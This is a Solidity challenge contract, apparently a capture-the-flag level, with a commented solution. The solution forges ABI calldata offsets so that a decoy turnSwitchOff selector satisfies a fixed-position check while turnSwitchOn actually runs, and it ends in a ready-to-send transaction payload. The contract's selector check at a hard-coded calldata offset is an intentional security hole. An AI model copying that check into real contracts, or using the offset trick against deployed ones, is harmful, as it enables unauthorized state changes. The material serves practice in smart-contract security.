// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}

/**
const calldata = web3.eth.abi.encodeFunctionCall({
  name: 'flipSwitch',
  type: 'function',
  inputs: [{ type: 'bytes', name: '_data' }]
}, ['0x20606e15']); // 0x20606e15 is the function byte signature for turnSwitchOff()
76227e12 is turnSwitchOn()
原：
    30c13ade
00: 0000000000000000000000000000000000000000000000000000000000000020
20: 0000000000000000000000000000000000000000000000000000000000000004
40: 20606e1500000000000000000000000000000000000000000000000000000000
改：
    30c13ade
00: 0000000000000000000000000000000000000000000000000000000000000060
20: 0000000000000000000000000000000000000000000000000000000000000000
40: 20606e1500000000000000000000000000000000000000000000000000000000
60: 0000000000000000000000000000000000000000000000000000000000000004
80: 76227e1200000000000000000000000000000000000000000000000000000000
30c13ade is the same function selector for flipSwitch(bytes).
00: Same logic as before, but tell the program to jump to offset 60 instead of 20.
20: Empty padding.
40: Arbitrary bytes that exist solely to trick the onlyOff modifier!
60, 80: The actual _data value, following the same logic as before. Except now _data is set to 76227e12 (the function byte selector for turnSwitchOn())!

const bypass = '0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000'
await ethereum.request({
  method: 'eth_sendTransaction',
  params: [{
    from: (await ethereum.request({ method: 'eth_requestAccounts' }))[0],
    to: instance,
    data: bypass
  }]
});
*/